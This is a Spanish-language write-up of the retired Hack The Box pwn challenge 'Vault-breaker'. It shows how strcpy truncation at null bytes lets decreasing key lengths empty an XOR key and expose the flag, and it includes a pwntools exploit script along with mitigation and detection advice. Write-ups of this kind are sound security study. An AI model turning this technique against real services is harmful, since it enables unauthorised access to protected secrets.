---
challenge: Vault-breaker
category: Challenge
type: Pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, logic-bug, xor, strcpy, null-byte, pwntools]
---

# Vault-breaker — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired por evidencia de writeups públicos; no comprobado con sesión en HTB.
> Sin flags ni claves de la instancia real.

## TL;DR

El «cifrado» del vault es un XOR entre la flag y una clave aleatoria. La clave se copia con `strcpy` desde un búfer que puede contener bytes nulos, así que se trunca en el primer `\0`. Generando claves de longitud 31, 30, … hasta 0, la clave global queda vacía y el XOR no altera nada: la flag sale en claro. No hay corrupción de memoria.

## Enunciado y superficie

- Categoría **Pwn**, dificultad **Very Easy**, ELF x86-64 y una instancia remota.
- Menú con dos opciones: generar una clave nueva o «asegurar el vault».
- La segunda opción imprime la flag cifrada con XOR; la primera deja elegir la longitud de la clave (0–31).

```bash
file vault-breaker
checksec --file=vault-breaker
```

```text
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Todas las protecciones están activas y no importan: el fallo es de lógica.

## Reconocimiento

```text
 Current status:  Unlocked 🔓
 [+] Random secure encryption key has been generated!

 1. Generate new key 🆕
 2. Secure the Vault 🔒
 >
```

Elegir `2` imprime `Master password for Vault:` seguido de bytes no imprimibles. Elegir `1` pide una longitud y regenera la clave. El menú vuelve a empezar tras cada operación, así que se puede iterar.

## Análisis del código

Dos funciones concentran el comportamiento:

```c
void new_key_gen() {
    char new_key[40];
    size_t length = 0x22;
    FILE *f = fopen("/dev/urandom", "rb");

    while (length > 0x1f) {
        printf("[*] Length of new password (0-31): ");
        length = read_num();
    }
    memset(new_key, 0, 32);
    read(fileno(f), new_key, length);

    for (i = 0; i < length; i++)
        while (new_key[i] == '\0')
            read(fileno(f), &new_key[i], 1);

    strcpy(random_key, new_key);      // copia hasta el primer NUL
    fclose(f);
}

void secure_password() {
    read(fileno(fp), flag, 0x17);
    for (i = 0; i < strlen(flag); i++)
        putchar(random_key[i] ^ flag[i]);
}
```

`random_key` es una global. `secure_password` lee la flag y la XOR con esa global byte a byte.

## Explicación del fallo

`strcpy` copia hasta el primer byte nulo, no `length` bytes. El búfer `new_key` se llena con bytes aleatorios y el bucle evita que el byte **de la posición `i`** sea nulo, pero no impide que aparezca un nulo antes, ni que la longitud sea menor que el contenido previo de `random_key`.

Al reducir la longitud de 31 a 0, el terminador se desplaza hacia el principio y cada copia deja la clave más corta. Con longitud 0, `new_key[0]` es `\0` y `strcpy` escribe un único byte nulo en `random_key`: la clave queda vacía y `random_key[i]` vale 0 para todo `i`.

```text
clave larga:  [ k0 k1 k2 ... k30 00 ]
clave corta:  [ k0 00 ]
longitud 0:   [ 00 ]
```

`flag[i] ^ 0 = flag[i]`: el «cifrado» devuelve la flag tal cual.

## Reproducción local

```bash
./vault-breaker
# 1 -> longitud 31, repetir bajando hasta 0
# 2 -> imprime la flag
```

En GDB se ve la global después de cada copia:

```gdb
break *new_key_gen+299
x/4gx &random_key
```

Tras varias iteraciones, los cuatro qwords de `random_key` acaban a cero.

## Explotación

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', '<PORT>'
p = remote(HOST, PORT)

for length in range(31, -1, -1):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(length).encode())

p.sendlineafter(b'> ', b'2')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- El orden importa: de mayor a menor; si se sube, la clave vuelve a crecer.
- La longitud 0 es la que deja el terminador en el primer byte.
- No hay offsets ni ASLR que calcular: el payload es una secuencia de números.
- Si el servicio limita las iteraciones, se puede repetir la conexión; la clave es por proceso.

## Evidencia

- `checksec` con todas las protecciones activas.
- `random_key` a cero en GDB tras la secuencia.
- Salida local con una flag de prueba, nunca la real.

## Lecciones aprendidas

- Un cifrado con clave regenerable por el atacante no protege nada, aunque use `/dev/urandom`.
- `strcpy` sobre datos binarios trunca en el primer nulo; el bug no está en el XOR sino en tratar bytes como cadena.
- El bucle que rellena huecos nulos no garantiza que no haya un nulo anterior.
- Bajar la longitud es una forma de «vaciar» la clave sin escribir memoria.
- No todo Pwn es corrupción: revisar la lógica antes de buscar un ROP ahorra tiempo.

## Mitigaciones y detección

- Usar `memcpy` con la longitud explícita y almacenar la clave con su tamaño, no como cadena C.
- No permitir que el usuario elija la longitud de la clave; generarla completa y rotarla desde el servidor.
- Cifrar con AES-GCM o ChaCha20-Poly1305, no con XOR.
- Detección: secuencias de generación de clave con longitudes decrecientes y una petición final de descifrado; claves de longitud 0.
- Referencias: CWE-170 (improper null termination), CWE-327 (broken crypto), MITRE T1552.

## Referencias

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/vault-breaker/>
- <https://cwe.mitre.org/data/definitions/170.html>
- <https://man7.org/linux/man-pages/man3/strcpy.3.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
